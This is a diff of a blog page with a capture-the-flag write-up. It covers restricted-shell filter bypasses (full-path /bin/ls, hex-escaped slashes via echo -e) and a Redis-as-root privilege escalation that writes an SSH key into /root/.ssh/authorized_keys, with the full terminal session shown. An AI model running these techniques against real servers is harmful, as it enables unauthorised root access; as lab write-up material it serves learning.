@@ -164,15 +164,15 @@ layui.use('element', function(){
 <h3 id="target-practice">Target Practice</h3>
 <p>We also got a file to download for this challenge, but it had a <code>.gif</code> extension this time. When you opened it, you could see concentric circles in the middle and some dots around it. The dots were changing with every frame. I had the suspicion that I was looking at some kind of 2d barcode, but I had to check it. After some googling, I could confirm that I was right, and each frame contained a Maxi Code.</p>
 <p>I wrote a small script to export every frame as a separate file. As the gif contained only 22 frames, I decided to check each one by hand as it would have taken more time to write a script for that. In the end, I found the flag in one of the frames.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
-
-<span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
-
-<span style="color:#66d9ef">with</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;target_practice.gif&#34;</span>) <span style="color:#66d9ef">as</span> im:
-    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(im<span style="color:#f92672">.</span>n_frames):
-        im<span style="color:#f92672">.</span>seek(i)
-        im<span style="color:#f92672">.</span>save(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;target_practice/frame</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">.gif&#34;</span>)
-</code></pre></div><h3 id="six-four-over-two">Six Four Over Two</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;target_practice.gif&#34;</span>) <span style="color:#66d9ef">as</span> im:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(im<span style="color:#f92672">.</span>n_frames):
+</span></span><span style="display:flex;"><span>        im<span style="color:#f92672">.</span>seek(i)
+</span></span><span style="display:flex;"><span>        im<span style="color:#f92672">.</span>save(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;target_practice/frame</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">.gif&#34;</span>)
+</span></span></code></pre></div><h3 id="six-four-over-two">Six Four Over Two</h3>
 <p>For this challenge, the solution was hinted at in the title and in the description (<code>cover all the bases</code>). With these hints, I realized that I was looking at a <code>base32</code> encoded text, so I decoded it, and that was all I had to do.</p>
 <h3 id="butter-overflow">Butter Overflow</h3>
 <p>This time the downloadable file was a source code for a small program written in c. After reading it, you could see multiple things:</p>
@@ -202,79 +202,79 @@ layui.use('element', function(){
 <h3 id="bad-words">Bad Words</h3>
 <p>We were presented with a shell in this challenge, and we had to find the flag there. I tried running <code>ls</code>, but it was forbidden because it contained a &ldquo;bad word&rdquo;. After trying some other basic commands, I had to realize that all of them were forbidden.</p>
 <p>At this point, I randomly tried to call <code>ls</code> with its full path (<code>/bin/ls</code>), and to my surprise, it worked. After this, all I had to do was traversing the directory structure using <code>/bin/ls</code> and printing the flag with <code>/bin/cat</code> once I found it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">user@host:/home/user$ /bin/cat just/out/of/reach/flag.txt
-/bin/cat just/out/of/reach/flag.txt
-flag<span style="color:#f92672">{</span>2d43e30a358d3f30fe65cc47a9cbbe98<span style="color:#f92672">}</span>
-</code></pre></div><h3 id="shelle">Shelle</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@host:/home/user$ /bin/cat just/out/of/reach/flag.txt
+</span></span><span style="display:flex;"><span>/bin/cat just/out/of/reach/flag.txt
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>2d43e30a358d3f30fe65cc47a9cbbe98<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="shelle">Shelle</h3>
 <p>In this challenge, we got access to a shell with some limitations. We only had a few commands that we could use, but <code>ls</code> was one of them, so I ran it. In the output, I’ve seen that there&rsquo;s an <code>assignment.txt</code> in the current folder, so I printed it. It was a task list for the students who were supposed to use the system, but it also said that the flag is in <code>/opt</code>. I tried to print the flag using <code>cat</code>, but I got an error that my command contained an illegal character.</p>
 <p>After some trial, I found that <code>/</code> was illegal (among a few other characters). I tried to bypass the check by encoding the character, but it wasn&rsquo;t working at first. After some googling, I found that I have to use the <code>-e</code> flag for echo to enable interpreting backslash-escaped characters (FYI: I&rsquo;m using Mac OS, and the version of <code>echo</code> there doesn&rsquo;t require any flag for escaping to work correctly). After this realization, I could craft a command that could print the flag, and it worked flawlessly.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; cat <span style="color:#66d9ef">$(</span>echo -e <span style="color:#e6db74">&#34;\x2fopt\x2fflag.txt&#34;</span><span style="color:#66d9ef">)</span>
-</code></pre></div><h3 id="redlike">Redlike</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; cat <span style="color:#66d9ef">$(</span>echo -e <span style="color:#e6db74">&#34;\x2fopt\x2fflag.txt&#34;</span><span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><h3 id="redlike">Redlike</h3>
 <p>This challenge was my favorite. All we got is an SSH command and a password for connecting to a remote server. Our task was to gain root access and read the flag in <code>/root</code>. I had no idea how to start, so I began to look into basic things after connecting to the remote machine. I&rsquo;ve seen that the machine is running Ubuntu 20.4 LTS with a recent kernel. I tried to look for local privilege escalations in these but with no luck.</p>
 <p>After some search, I stumbled upon <a href="https://payatu.com/guide-linux-privilege-escalation">this</a> article about a few basic ideas on how to start in these scenarios. I tried the techniques one-by-one, and 2 of them looked like a possible solution. First, I tried to see if I could exploit the cron jobs to create a root shell, but I had no success. After that, my attention shifted to the other possibility. I&rsquo;d previously seen that there&rsquo;s a Redis server running as root. In the article, they showed us an example for MySQL running as root, but I thought it was worth trying.</p>
 <p>After some research, I found <a href="https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html">this</a> article explaining how we can use Redis to add our own ssh key to any user&rsquo;s authorized keys. I followed the steps, and after only a few minutes, I could SSH to localhost as root and read the flag.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh-keygen
-Generating public/private rsa key pair.
-Enter file in which to save the key <span style="color:#f92672">(</span>/home/user/.ssh/id_rsa<span style="color:#f92672">)</span>: ./id_rsa
-Enter passphrase <span style="color:#f92672">(</span>empty <span style="color:#66d9ef">for</span> no passphrase<span style="color:#f92672">)</span>:
-Enter same passphrase again:
-Your identification has been saved in ./id_rsa
-Your public key has been saved in ./id_rsa.pub
-The key fingerprint is:
-SHA256:j7Uxe4PP+dP9nO+uvWzTbJUdbN5n2FyckwGXbnTFAyg user@redlike-44e6479a7e6be38a-6559588cdd-ww42g
-The key<span style="color:#ae81ff">\&#39;</span>s randomart image is:
-+---<span style="color:#f92672">[</span>RSA 3072<span style="color:#f92672">]</span>----+
-|            .ooo+|
-|         E .  .<span style="color:#f92672">=</span>o|
-|          .   +.*|
-|               Xo|
-|        S +   ++B|
-|         + *  .oO|
-|        . <span style="color:#f92672">=</span> o  <span style="color:#f92672">+=</span>|
-|           + oo<span style="color:#f92672">=</span>B|
-|            +.+X%|
-+----<span style="color:#f92672">[</span>SHA256<span style="color:#f92672">]</span>-----+
-user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ <span style="color:#f92672">(</span>echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span>; cat id_rsa.pub; echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span><span style="color:#f92672">)</span> &gt; foo.txt
-user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ redis-cli flushall
-OK
-user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ cat foo.txt | redis-cli -x set crackit
-OK
-user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ redis-cli
-127.0.0.1:6379&gt; config set dir /root/.ssh/
-OK
-127.0.0.1:6379&gt; config get dir
-1<span style="color:#f92672">)</span> <span style="color:#e6db74">&#34;dir&#34;</span>
-2<span style="color:#f92672">)</span> <span style="color:#e6db74">&#34;/root/.ssh&#34;</span>
-127.0.0.1:6379&gt; config set dbfilename <span style="color:#e6db74">&#34;authorized_keys&#34;</span>
-OK
-127.0.0.1:6379&gt; save
-OK
-127.0.0.1:6379&gt;
-user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh -i id_rsa root@127.0.0.1
-Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>:
-Welcome to Ubuntu 20.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.120+ x86_64<span style="color:#f92672">)</span>
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-This system has been minimized by removing packages and content that are
-not required on a system that users <span style="color:#66d9ef">do</span> not log into.
-
-To restore this content, you can run the <span style="color:#e6db74">&#39;unminimize&#39;</span> command.
-
-The programs included with the Ubuntu system are free software;
-the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# ls
-flag.txt
-root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# cat flag.txt
-flag<span style="color:#f92672">{</span>69dc14707af23b728ebd1363715ec890<span style="color:#f92672">}</span>
-</code></pre></div><h2 id="scripting">Scripting</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh-keygen
+</span></span><span style="display:flex;"><span>Generating public/private rsa key pair.
+</span></span><span style="display:flex;"><span>Enter file in which to save the key <span style="color:#f92672">(</span>/home/user/.ssh/id_rsa<span style="color:#f92672">)</span>: ./id_rsa
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#f92672">(</span>empty <span style="color:#66d9ef">for</span> no passphrase<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>Enter same passphrase again:
+</span></span><span style="display:flex;"><span>Your identification has been saved in ./id_rsa
+</span></span><span style="display:flex;"><span>Your public key has been saved in ./id_rsa.pub
+</span></span><span style="display:flex;"><span>The key fingerprint is:
+</span></span><span style="display:flex;"><span>SHA256:j7Uxe4PP+dP9nO+uvWzTbJUdbN5n2FyckwGXbnTFAyg user@redlike-44e6479a7e6be38a-6559588cdd-ww42g
+</span></span><span style="display:flex;"><span>The key<span style="color:#ae81ff">\&#39;</span>s randomart image is:
+</span></span><span style="display:flex;"><span>+---<span style="color:#f92672">[</span>RSA 3072<span style="color:#f92672">]</span>----+
+</span></span><span style="display:flex;"><span>|            .ooo+|
+</span></span><span style="display:flex;"><span>|         E .  .<span style="color:#f92672">=</span>o|
+</span></span><span style="display:flex;"><span>|          .   +.*|
+</span></span><span style="display:flex;"><span>|               Xo|
+</span></span><span style="display:flex;"><span>|        S +   ++B|
+</span></span><span style="display:flex;"><span>|         + *  .oO|
+</span></span><span style="display:flex;"><span>|        . <span style="color:#f92672">=</span> o  <span style="color:#f92672">+=</span>|
+</span></span><span style="display:flex;"><span>|           + oo<span style="color:#f92672">=</span>B|
+</span></span><span style="display:flex;"><span>|            +.+X%|
+</span></span><span style="display:flex;"><span>+----<span style="color:#f92672">[</span>SHA256<span style="color:#f92672">]</span>-----+
+</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ <span style="color:#f92672">(</span>echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span>; cat id_rsa.pub; echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span><span style="color:#f92672">)</span> &gt; foo.txt
+</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ redis-cli flushall
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ cat foo.txt | redis-cli -x set crackit
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ redis-cli
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; config set dir /root/.ssh/
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; config get dir
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> <span style="color:#e6db74">&#34;dir&#34;</span>
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> <span style="color:#e6db74">&#34;/root/.ssh&#34;</span>
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; config set dbfilename <span style="color:#e6db74">&#34;authorized_keys&#34;</span>
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; save
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt;
+</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh -i id_rsa root@127.0.0.1
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>:
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.120+ x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This system has been minimized by removing packages and content that are
+</span></span><span style="display:flex;"><span>not required on a system that users <span style="color:#66d9ef">do</span> not log into.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To restore this content, you can run the <span style="color:#e6db74">&#39;unminimize&#39;</span> command.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Ubuntu system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span style="display:flex;"><span>applicable law.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# ls
+</span></span><span style="display:flex;"><span>flag.txt
+</span></span><span style="display:flex;"><span>root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# cat flag.txt
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>69dc14707af23b728ebd1363715ec890<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="scripting">Scripting</h2>
 <h3 id="words-church">Words Church</h3>
 <p>There&rsquo;s not too much to write about this challenge; we had to find words in a grid. The catch was that we had to find a total of 150 words (with the grid changing after every 5th word), so it would&rsquo;ve taken too much time to do it by hand. For this reason, I wrote a script that connected to the server, parsed the grid every time we got a new one and searched for the word in the grid with a simple brute force algorithm. You can find the script <a href="https://gist.github.com/PsHegger/1c122885e81d84bafcd3641fe82d6fb7">here</a>.</p>
 <h3 id="otp-smasher">OTP Smasher</h3>
@@ -302,6 +302,48 @@ flag<span style="color:#f92672">{</span>69dc14707af23b728ebd1363715ec890<span st
             <div class="layui-card single-card">
                 <h2 class="single-title">Recent Posts</h2>
             
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote self-elem-quote-bg-orange" style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/procedural-dungeon/">
+                        <h3 class="">Procedural Dungeon Generation</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2022-03-10</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/gamedev/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">gamedev</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/kotlin/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">kotlin</span>
+        </a>
+    
+        <a href="/tags/procgen/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">procgen</span>
+        </a>
+    
+        <a href="/tags/gamedev/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">gamedev</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
                 
                 <div style="margin-left: 10px;">
                     <blockquote class="self-elem-quote self-elem-quote-bg-orange" style="background-color:#FFFFFF;margin-top: 10px;">
@@ -484,56 +526,6 @@ flag<span style="color:#f92672">{</span>69dc14707af23b728ebd1363715ec890<span st
     
         <a href="/tags/parallelism/">
             <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">parallelism</span>
-        </a>
-    
-    
-</h3>
-                    </blockquote>
-                </div>
-                
-                <div style="margin-left: 10px;">
-                    <blockquote class="self-elem-quote self-elem-quote-bg-orange" style="background-color:#FFFFFF;margin-top: 10px;">
-                    <a href="/post/grpc-talk/">
-                        <h3 class="">gRPC for Kotliners</h3>
-                    </a>
-                    <h3 style="margin-top:10px; margin-bottom:10px"> 
-    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
-    <span>2019-11-14</span>
-
-    
-     
-    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
-    
-
-    
-        <a href="/categories/android/">
-            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">android</span>
-        </a>
-    
-        <a href="/categories/kotlin/">
-            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">kotlin</span>
-        </a>
-    
-        <a href="/categories/talks/">
-            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">talks</span>
-        </a>
-    
-
-    
-    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
-    
-
-    
-        <a href="/tags/kotlin/">
-            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">kotlin</span>
-        </a>
-    
-        <a href="/tags/android/">
-            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">android</span>
-        </a>
-    
-        <a href="/tags/grpc/">
-            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">grpc</span>
         </a>
     
     
